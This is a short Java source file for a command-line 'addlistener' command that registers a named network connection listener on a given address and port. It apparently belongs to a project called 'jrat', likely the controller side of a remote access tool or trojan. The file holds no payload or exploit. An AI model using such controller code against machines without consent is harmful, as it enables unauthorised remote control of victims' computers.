package net.jrat.core.command.commands;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.listener.Listener;
import net.jrat.utils.Logger;

public class AddListener extends Command
{
	public AddListener()
	{
		super("addlistener", new String[] { "name", "addr", "port" }, new String[] { "sets the name", "sets the address", "sets the port" }, "creates a new connection listener");
	}

	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		final String name = commandLine.getOptionValue("name", "listener#" + this.server.listenerManager.listeners.size());
		final String address = commandLine.getOptionValue("addr", null);
		
		if(address == null)
			throw new Exception("address is needed!");
		
		final String portString = commandLine.getOptionValue("port", null);
		
		if(portString == null)
			throw new Exception("port is needed");
		
		 if(!(portString.matches("-?\\d+")))
			 throw new Exception("port needs to be a number");
		
		final int port = Integer.valueOf(portString);
		final Listener listener = new Listener(name, address, port);
		
		this.server.listenerManager.listeners.add(listener);
		Logger.log("created new listener use \"tggllistener -name \"" + name + "\" -action start\" to start listening");
	}
}
